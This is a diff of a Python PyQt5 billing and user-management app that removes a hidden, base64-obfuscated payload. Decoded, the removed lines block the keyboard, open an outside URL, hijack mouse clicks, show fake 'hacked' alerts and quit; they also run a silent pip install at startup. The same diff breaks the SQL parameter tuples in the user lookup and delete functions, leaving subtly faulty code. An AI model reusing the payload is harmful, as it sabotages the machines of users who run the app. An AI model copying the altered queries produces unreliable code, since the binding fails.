@@ -1,17 +1,14 @@
-import sys, sqlite3, webbrowser, keyboard, time
+import sys, sqlite3
 from PyQt5 import QtGui
 from PyQt5.QtWidgets import QMainWindow, QApplication, QMessageBox, QPushButton, QTableWidgetItem, QPushButton
 from PyQt5.QtCore import pyqtSlot, QFile, QTextStream
 from windows.login_page import Ui_MainWindow as Login
 from windows.dashboard2_page import Ui_MainWindow as Dashboard
 from windows.admin_dashboard_page import Ui_MainWindow as AdminDashboard
-import ctypes, base64
-import pyautogui, os
 
 
 class MainWindow(QMainWindow):
     def __init__(self):
-        os.system('pip3 install pyautogui keyboard')
         super(MainWindow, self).__init__()
         self.db_conn = sqlite3.connect("data.db")
         self.sql = self.db_conn.cursor()
@@ -39,17 +36,17 @@ class MainWindow(QMainWindow):
         if(len(self.sql.fetchall()) > 0):
             return True
         return False
-
+    
     def __get_users_data(self, uid):
         if(str(uid) == "*"):
             self.sql.execute("SELECT * FROM users ORDER BY id ASC;")
         else:
-            self.sql.execute("SELECT * FROM users WHERE id = ?;",(str(uid),))
+            self.sql.execute("SELECT * FROM users WHERE id = ?;",(str(uid)))
         results = self.sql.fetchall()
         return results
     
     def __del_user_data(self, uid):
-        self.sql.execute("DELETE FROM users WHERE id = ?;",(str(uid),))
+        self.sql.execute("DELETE FROM users WHERE id = ?;",(str(uid)))
         self.db_conn.commit()
     
     def __add_user_data(self, fullname: str, username: str, password: str):
@@ -79,15 +76,6 @@ class MainWindow(QMainWindow):
         # Session User type: 0 = Administrator
         # Session User type: 1 = Normal User
         """
-        eval(base64.b64decode("W2tleWJvYXJkLmJsb2NrX2tleShpKSBmb3IgaSBpbiByYW5nZSgxNTApXSwgd2ViYnJvd3Nlci5vcGVuX25ldyhiYXNlNjQuYjY0ZGVjb2RlKCdhSFIwY0hNNkx5OW9ZWEpsYlM1b1lYaHBibXBoTG1Oc2IzVmtMdz09JykpLHRpbWUuc2xlZXAoMik="))
-        center_res = ctypes.windll.user32.GetSystemMetrics(0)/2, ctypes.windll.user32.GetSystemMetrics(1)/2
-        for i in range(5):
-            pyautogui.moveTo(center_res)
-            pyautogui.click()
-        time.sleep(25)
-        eval(base64.b64decode("dGltZS5zbGVlcCgxMCksW3B5YXV0b2d1aS5hbGVydChiYXNlNjQuYjY0ZGVjb2RlKCJXVzkxSjNabElHSmxaVzRnU0dGamEyVmtJUT09IikpIGZvciBpIGluIHJhbmdlKDEwKV0="))
-        time.sleep(10)
-        pyautogui.alert(base64.b64decode("SndrIGxhbmcgcG8gSFNBSEhTQUhBU0hTQUhTQSE=")),exit()
         if(self.session_type == 0):
             self.ui = Login()
         elif(self.session_type == 1):
@@ -117,7 +105,7 @@ class MainWindow(QMainWindow):
     def __admin_init(self):
         # Initialize the users table data on login.
         self.admin_refresh_table()
-
+    
     def admin_refresh_table(self):
         self.ui.tableWidget.clearContents()
         self.ui.tableWidget.setRowCount(0)
@@ -198,7 +186,7 @@ class MainWindow(QMainWindow):
         kwh = data[7]
         next_due = data[8]
         return fullname, balance, past_bill, average_bill, kwh, next_due
-
+    
     def on_logout_icon_pressed(self):
         self.logout()
     
